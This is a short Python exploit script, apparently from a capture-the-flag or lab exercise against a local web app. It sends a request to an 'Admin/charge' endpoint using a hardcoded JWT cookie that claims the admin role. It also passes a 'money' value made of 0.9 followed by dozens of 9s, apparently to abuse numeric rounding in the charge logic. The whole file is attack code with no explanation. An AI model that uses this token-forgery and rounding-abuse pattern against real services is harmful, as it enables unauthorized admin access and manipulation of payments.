import requests
url="http://localhost:8000/"
cookie={
    "jwt":"eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgImlhdCI6IDE3NDc5Mjc4MjV9._FaDd8rgh9fOC7E69Hxx3mN0aBVXGLj_9cFsJVbvCcU"
}
param={
    "money":"0.999999999999999999"+'9'*50
}
result=requests.get(url+"Admin/charge",params=param,cookies=cookie)
print(result.text)